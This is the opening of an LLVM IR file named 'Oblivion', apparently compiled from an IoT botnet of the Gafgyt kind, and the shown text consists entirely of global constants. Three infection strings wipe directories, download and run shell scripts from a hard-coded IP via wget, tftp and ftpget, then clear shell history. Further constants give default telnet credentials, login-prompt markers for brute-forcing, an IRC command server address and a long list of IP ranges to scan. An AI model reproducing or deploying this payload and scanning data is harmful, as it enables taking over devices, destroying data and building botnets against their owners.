; ModuleID = 'host/ir_O0/Oblivion.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.5, %union.anon.6 }
%union.anon.5 = type { [16 x i8] }
%union.anon.6 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infect2 = global i8* getelementptr inbounds ([507 x i8], [507 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [507 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *;history -c\0D\0A\00", align 1
@infect = global i8* getelementptr inbounds ([496 x i8], [496 x i8]* @.str.1, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [496 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *\0D\0A\00", align 1
@phonepayload = global i8* getelementptr inbounds ([508 x i8], [508 x i8]* @.str.2, i32 0, i32 0), align 8
@.str.2 = private unnamed_addr constant [508 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; rm -rf *;  wget http://139.59.12.52/deltahaxsyeaok.sh; chmod 777 deltahaxsyeaok.sh; sh deltahaxsyeaok.sh;  tftp 139.59.12.52 -c get ukloltftp1.sh; chmod 777 ukloltftp1.sh; sh ukloltftp1.sh; tftp -r ukloltftp2.sh -g 139.59.12.52; chmod 777 ukloltftp2.sh; sh ukloltftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.12.52 ukloltftp1.sh ukloltftp1; sh ukloltftp1; rm -rf deltahaxsyeaok.sh ukloltftp1.sh ukloltftp2.sh ftp1.sh; rm -rf *; history -c\0D\0A\00", align 1
@usernames = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@.str.3 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@phone = global [7 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.9, i32 0, i32 0), i8* null], align 16
@.str.4 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.5 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.6 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.7 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@.str.8 = private unnamed_addr constant [6 x i8] c"Linux\00", align 1
@.str.9 = private unnamed_addr constant [9 x i8] c"9615-cdp\00", align 1
@passwords = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i32 0, i32 0)], align 8
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.7, i32 0, i32 0), i8* null], align 16
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* null], align 16
@.str.10 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.11 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.12 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.13 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.14 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.15 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.16 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@.str.17 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.18 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@infected = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@.str.20 = private unnamed_addr constant [14 x i8] c"Device Repped\00", align 1
@infectedmessage = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.20, i32 0, i32 0)], align 8
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.30, i32 0, i32 0), i8* null], align 16
@.str.21 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.22 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.23 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.24 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.25 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.26 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.27 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.28 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.29 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.30 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.19, i32 0, i32 0), i8* null], align 16
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.31, i32 0, i32 0)], align 8
@.str.31 = private unnamed_addr constant [19 x i8] c"144.202.54.51:6667\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Phonepid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.32 = private unnamed_addr constant [16 x i8] c"/usr/dict/words\00", align 1
@.str.33 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.500 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.34 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.35 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.36 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.37 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.38 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.39 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.40 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@ipState = internal global [5 x i8] zeroinitializer, align 1
@.str.42 = private unnamed_addr constant [12 x i8] c"112.5.%d.%d\00", align 1
@.str.43 = private unnamed_addr constant [14 x i8] c"117.165.%d.%d\00", align 1
@.str.44 = private unnamed_addr constant [11 x i8] c"85.3.%d.%d\00", align 1
@.str.45 = private unnamed_addr constant [13 x i8] c"41.252.%d.%d\00", align 1
@.str.46 = private unnamed_addr constant [13 x i8] c"104.55.%d.%d\00", align 1
@.str.47 = private unnamed_addr constant [13 x i8] c"78.186.%d.%d\00", align 1
@.str.48 = private unnamed_addr constant [13 x i8] c"78.189.%d.%d\00", align 1
@.str.49 = private unnamed_addr constant [14 x i8] c"221.120.%d.%d\00", align 1
@.str.50 = private unnamed_addr constant [11 x i8] c"88.5.%d.%d\00", align 1
@.str.51 = private unnamed_addr constant [13 x i8] c"41.254.%d.%d\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"103.20.%d.%d\00", align 1
@.str.53 = private unnamed_addr constant [13 x i8] c"103.47.%d.%d\00", align 1
@.str.54 = private unnamed_addr constant [13 x i8] c"103.57.%d.%d\00", align 1
@.str.55 = private unnamed_addr constant [13 x i8] c"45.117.%d.%d\00", align 1
@.str.56 = private unnamed_addr constant [13 x i8] c"101.51.%d.%d\00", align 1
@.str.57 = private unnamed_addr constant [13 x i8] c"137.59.%d.%d\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"14.204.%d.%d\00", align 1
@.str.59 = private unnamed_addr constant [12 x i8] c"27.50.%d.%d\00", align 1
@.str.60 = private unnamed_addr constant [12 x i8] c"27.54.%d.%d\00", align 1
@.str.61 = private unnamed_addr constant [12 x i8] c"27.98.%d.%d\00", align 1
@.str.62 = private unnamed_addr constant [12 x i8] c"36.32.%d.%d\00", align 1
@.str.63 = private unnamed_addr constant [13 x i8] c"36.248.%d.%d\00", align 1
@.str.64 = private unnamed_addr constant [12 x i8] c"39.64.%d.%d\00", align 1
@.str.65 = private unnamed_addr constant [13 x i8] c"43.253.%d.%d\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"43.230.%d.%d\00", align 1
@.str.67 = private unnamed_addr constant [13 x i8] c"163.53.%d.%d\00", align 1
@.str.68 = private unnamed_addr constant [13 x i8] c"43.245.%d.%d\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"123.25.%d.%d\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"103.54.%d.%d\00", align 1
@.str.71 = private unnamed_addr constant [13 x i8] c"27.255.%d.%d\00", align 1
@.str.72 = private unnamed_addr constant [14 x i8] c"103.204.%d.%d\00", align 1
@.str.73 = private unnamed_addr constant [13 x i8] c"123.24.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [14 x i8] c"113.191.%d.%d\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"113.188.%d.%d\00", align 1
@.str.76 = private unnamed_addr constant [14 x i8] c"113.189.%d.%d\00", align 1
@.str.77 = private unnamed_addr constant [13 x i8] c"14.160.%d.%d\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"14.161.%d.%d\00", align 1
@.str.79 = private unnamed_addr constant [13 x i8] c"14.162.%d.%d\00", align 1
@.str.80 = private unnamed_addr constant [13 x i8] c"14.163.%d.%d\00", align 1
@.str.81 = private unnamed_addr constant [13 x i8] c"14.164.%d.%d\00", align 1
@.str.82 = private unnamed_addr constant [13 x i8] c"14.165.%d.%d\00", align 1
@.str.83 = private unnamed_addr constant [13 x i8] c"14.166.%d.%d\00", align 1
@.str.84 = private unnamed_addr constant [13 x i8] c"14.167.%d.%d\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"14.168.%d.%d\00", align 1
@.str.86 = private unnamed_addr constant [13 x i8] c"14.169.%d.%d\00", align 1
@.str.87 = private unnamed_addr constant [13 x i8] c"14.170.%d.%d\00", align 1
@.str.88 = private unnamed_addr constant [13 x i8] c"14.171.%d.%d\00", align 1
@.str.89 = private unnamed_addr constant [13 x i8] c"14.172.%d.%d\00", align 1
@.str.90 = private unnamed_addr constant [13 x i8] c"14.173.%d.%d\00", align 1
@.str.91 = private unnamed_addr constant [13 x i8] c"14.174.%d.%d\00", align 1
@.str.92 = private unnamed_addr constant [13 x i8] c"14.175.%d.%d\00", align 1
@.str.93 = private unnamed_addr constant [13 x i8] c"14.176.%d.%d\00", align 1
@.str.94 = private unnamed_addr constant [13 x i8] c"14.177.%d.%d\00", align 1
@.str.95 = private unnamed_addr constant [13 x i8] c"14.178.%d.%d\00", align 1
@.str.96 = private unnamed_addr constant [13 x i8] c"14.179.%d.%d\00", align 1
@.str.97 = private unnamed_addr constant [13 x i8] c"14.180.%d.%d\00", align 1
@.str.98 = private unnamed_addr constant [13 x i8] c"14.181.%d.%d\00", align 1
@.str.99 = private unnamed_addr constant [13 x i8] c"14.182.%d.%d\00", align 1
@.str.100 = private unnamed_addr constant [13 x i8] c"14.183.%d.%d\00", align 1
@.str.101 = private unnamed_addr constant [13 x i8] c"14.184.%d.%d\00", align 1
@.str.102 = private unnamed_addr constant [13 x i8] c"14.185.%d.%d\00", align 1
@.str.103 = private unnamed_addr constant [13 x i8] c"14.186.%d.%d\00", align 1
@.str.104 = private unnamed_addr constant [13 x i8] c"14.187.%d.%d\00", align 1
@.str.105 = private unnamed_addr constant [13 x i8] c"14.188.%d.%d\00", align 1
@.str.106 = private unnamed_addr constant [13 x i8] c"14.189.%d.%d\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"14.190.%d.%d\00", align 1
@.str.108 = private unnamed_addr constant [13 x i8] c"14.191.%d.%d\00", align 1
@.str.109 = private unnamed_addr constant [13 x i8] c"45.121.%d.%d\00", align 1
@.str.110 = private unnamed_addr constant [13 x i8] c"45.120.%d.%d\00", align 1
@.str.111 = private unnamed_addr constant [13 x i8] c"45.115.%d.%d\00", align 1
@.str.112 = private unnamed_addr constant [13 x i8] c"43.252.%d.%d\00", align 1
@.str.113 = private unnamed_addr constant [13 x i8] c"43.240.%d.%d\00", align 1
@.str.114 = private unnamed_addr constant [13 x i8] c"41.174.%d.%d\00", align 1
@.str.115 = private unnamed_addr constant [13 x i8] c"45.127.%d.%d\00", align 1
@.str.116 = private unnamed_addr constant [13 x i8] c"103.30.%d.%d\00", align 1
@.str.117 = private unnamed_addr constant [13 x i8] c"123.16.%d.%d\00", align 1
@.str.118 = private unnamed_addr constant [13 x i8] c"202.44.%d.%d\00", align 1
@.str.119 = private unnamed_addr constant [13 x i8] c"116.93.%d.%d\00", align 1
@.str.120 = private unnamed_addr constant [13 x i8] c"41.253.%d.%d\00", align 1
@.str.121 = private unnamed_addr constant [14 x i8] c"117.173.%d.%d\00", align 1
@.str.122 = private unnamed_addr constant [14 x i8] c"113.190.%d.%d\00", align 1
@.str.123 = private unnamed_addr constant [14 x i8] c"112.196.%d.%d\00", align 1
@.str.124 = private unnamed_addr constant [14 x i8] c"113.178.%d.%d\00", align 1
@.str.125 = private unnamed_addr constant [13 x i8] c"112.45.%d.%d\00", align 1
@.str.126 = private unnamed_addr constant [14 x i8] c"183.223.%d.%d\00", align 1
@.str.127 = private unnamed_addr constant [13 x i8] c"116.71.%d.%d\00", align 1
@.str.128 = private unnamed_addr constant [13 x i8] c"103.44.%d.%d\00", align 1
@.str.129 = private unnamed_addr constant [14 x i8] c"110.235.%d.%d\00", align 1
@.str.130 = private unnamed_addr constant [14 x i8] c"124.253.%d.%d\00", align 1
@.str.131 = private unnamed_addr constant [14 x i8] c"211.237.%d.%d\00", align 1
@.str.132 = private unnamed_addr constant [14 x i8] c"117.175.%d.%d\00", align 1
@.str.133 = private unnamed_addr constant [12 x i8] c"111.9.%d.%d\00", align 1
@.str.134 = private unnamed_addr constant [14 x i8] c"222.252.%d.%d\00", align 1
@.str.135 = private unnamed_addr constant [14 x i8] c"113.174.%d.%d\00", align 1
@.str.136 = private unnamed_addr constant [14 x i8] c"113.160.%d.%d\00", align 1
@.str.137 = private unnamed_addr constant [14 x i8] c"113.161.%d.%d\00", align 1
@.str.138 = private unnamed_addr constant [14 x i8] c"113.162.%d.%d\00", align 1
@.str.139 = private unnamed_addr constant [14 x i8] c"113.163.%d.%d\00", align 1
@.str.140 = private unnamed_addr constant [14 x i8] c"113.164.%d.%d\00", align 1
@.str.141 = private unnamed_addr constant [14 x i8] c"113.165.%d.%d\00", align 1
@.str.142 = private unnamed_addr constant [14 x i8] c"113.166.%d.%d\00", align 1
@.str.143 = private unnamed_addr constant [14 x i8] c"113.167.%d.%d\00", align 1
@.str.144 = private unnamed_addr constant [14 x i8] c"113.168.%d.%d\00", align 1
@.str.145 = private unnamed_addr constant [14 x i8] c"113.169.%d.%d\00", align 1
@.str.146 = private unnamed_addr constant [13 x i8] c"123.17.%d.%d\00", align 1
@.str.147 = private unnamed_addr constant [13 x i8] c"123.21.%d.%d\00", align 1
@.str.148 = private unnamed_addr constant [13 x i8] c"123.22.%d.%d\00", align 1
@.str.149 = private unnamed_addr constant [14 x i8] c"222.253.%d.%d\00", align 1
@.str.150 = private unnamed_addr constant [14 x i8] c"222.254.%d.%d\00", align 1
@.str.151 = private unnamed_addr constant [14 x i8] c"222.255.%d.%d\00", align 1
@.str.152 = private unnamed_addr constant [13 x i8] c"41.208.%d.%d\00", align 1
@.str.153 = private unnamed_addr constant [14 x i8] c"103.198.%d.%d\00", align 1
@.str.154 = private unnamed_addr constant [13 x i8] c"88.248.%d.%d\00", align 1
@.str.155 = private unnamed_addr constant [13 x i8] c"88.105.%d.%d\00", align 1
@.str.156 = private unnamed_addr constant [13 x i8] c"88.247.%d.%d\00", align 1
@.str.157 = private unnamed_addr constant [13 x i8] c"85.105.%d.%d\00", align 1
@.str.158 = private unnamed_addr constant [12 x i8] c"188.3.%d.%d\00", align 1
@.str.159 = private unnamed_addr constant [14 x i8] c"103.203.%d.%d\00", align 1
@.str.160 = private unnamed_addr constant [13 x i8] c"103.55.%d.%d\00", align 1
@.str.161 = private unnamed_addr constant [14 x i8] c"103.220.%d.%d\00", align 1
@.str.162 = private unnamed_addr constant [14 x i8] c"183.233.%d.%d\00", align 1
@.str.163 = private unnamed_addr constant [14 x i8] c"103.242.%d.%d\00", align 1
@.str.164 = private unnamed_addr constant [13 x i8] c"103.14.%d.%d\00", align 1
@.str.165 = private unnamed_addr constant [14 x i8] c"103.195.%d.%d\00", align 1
@.str.166 = private unnamed_addr constant [14 x i8] c"103.214.%d.%d\00", align 1
@.str.167 = private unnamed_addr constant [14 x i8] c"103.218.%d.%d\00", align 1
@.str.168 = private unnamed_addr constant [14 x i8] c"103.225.%d.%d\00", align 1
@.str.169 = private unnamed_addr constant [14 x i8] c"103.228.%d.%d\00", align 1
@.str.170 = private unnamed_addr constant [14 x i8] c"103.231.%d.%d\00", align 1
@.str.171 = private unnamed_addr constant [13 x i8] c"103.60.%d.%d\00", align 1
@.str.172 = private unnamed_addr constant [14 x i8] c"103.248.%d.%d\00", align 1
@.str.173 = private unnamed_addr constant [14 x i8] c"103.253.%d.%d\00", align 1
@.str.174 = private unnamed_addr constant [14 x i8] c"103.255.%d.%d\00", align 1
@.str.175 = private unnamed_addr constant [14 x i8] c"113.176.%d.%d\00", align 1
@.str.176 = private unnamed_addr constant [14 x i8] c"113.175.%d.%d\00", align 1
@.str.177 = private unnamed_addr constant [14 x i8] c"203.134.%d.%d\00", align 1
@.str.178 = private unnamed_addr constant [14 x i8] c"203.210.%d.%d\00", align 1
@.str.179 = private unnamed_addr constant [14 x i8] c"117.176.%d.%d\00", align 1
@.str.180 = private unnamed_addr constant [14 x i8] c"117.171.%d.%d\00", align 1
@.str.181 = private unnamed_addr constant [14 x i8] c"117.162.%d.%d\00", align 1
@.str.182 = private unnamed_addr constant [14 x i8] c"203.150.%d.%d\00", align 1
@.str.183 = private unnamed_addr constant [14 x i8] c"157.119.%d.%d\00", align 1
@.str.184 = private unnamed_addr constant [13 x i8] c"43.228.%d.%d\00", align 1
@.str.185 = private unnamed_addr constant [13 x i8] c"162.12.%d.%d\00", align 1
@.str.186 = private unnamed_addr constant [14 x i8] c"115.220.%d.%d\00", align 1
@.str.187 = private unnamed_addr constant [14 x i8] c"125.114.%d.%d\00", align 1
@.str.188 = private unnamed_addr constant [14 x i8] c"119.157.%d.%d\00", align 1
@.str.189 = private unnamed_addr constant [14 x i8] c"119.150.%d.%d\00", align 1
@.str.190 = private unnamed_addr constant [14 x i8] c"119.151.%d.%d\00", align 1
@.str.191 = private unnamed_addr constant [14 x i8] c"119.152.%d.%d\00", align 1
@.str.192 = private unnamed_addr constant [14 x i8] c"119.153.%d.%d\00", align 1
@.str.193 = private unnamed_addr constant [14 x i8] c"119.154.%d.%d\00", align 1
@.str.194 = private unnamed_addr constant [14 x i8] c"119.155.%d.%d\00", align 1
@.str.195 = private unnamed_addr constant [14 x i8] c"119.156.%d.%d\00", align 1
@.str.196 = private unnamed_addr constant [14 x i8] c"119.158.%d.%d\00", align 1
@.str.197 = private unnamed_addr constant [14 x i8] c"119.159.%d.%d\00", align 1
@.str.198 = private unnamed_addr constant [13 x i8] c"191.24.%d.%d\00", align 1
@.str.199 = private unnamed_addr constant [14 x i8] c"187.119.%d.%d\00", align 1
@.str.200 = private unnamed_addr constant [14 x i8] c"177.215.%d.%d\00", align 1
@.str.201 = private unnamed_addr constant [14 x i8] c"152.241.%d.%d\00", align 1
@.str.202 = private unnamed_addr constant [14 x i8] c"182.185.%d.%d\00", align 1
@.str.203 = private unnamed_addr constant [13 x i8] c"179.80.%d.%d\00", align 1
@.str.204 = private unnamed_addr constant [13 x i8] c"179.81.%d.%d\00", align 1
@.str.205 = private unnamed_addr constant [13 x i8] c"179.82.%d.%d\00", align 1
@.str.206 = private unnamed_addr constant [13 x i8] c"179.83.%d.%d\00", align 1
@.str.207 = private unnamed_addr constant [13 x i8] c"179.84.%d.%d\00", align 1
@.str.208 = private unnamed_addr constant [13 x i8] c"179.86.%d.%d\00", align 1
@.str.209 = private unnamed_addr constant [13 x i8] c"179.87.%d.%d\00", align 1
@.str.210 = private unnamed_addr constant [13 x i8] c"179.88.%d.%d\00", align 1
@.str.211 = private unnamed_addr constant [13 x i8] c"179.89.%d.%d\00", align 1
@.str.212 = private unnamed_addr constant [13 x i8] c"179.90.%d.%d\00", align 1
@.str.213 = private unnamed_addr constant [13 x i8] c"179.91.%d.%d\00", align 1
@.str.214 = private unnamed_addr constant [13 x i8] c"179.92.%d.%d\00", align 1
@.str.215 = private unnamed_addr constant [13 x i8] c"179.93.%d.%d\00", align 1
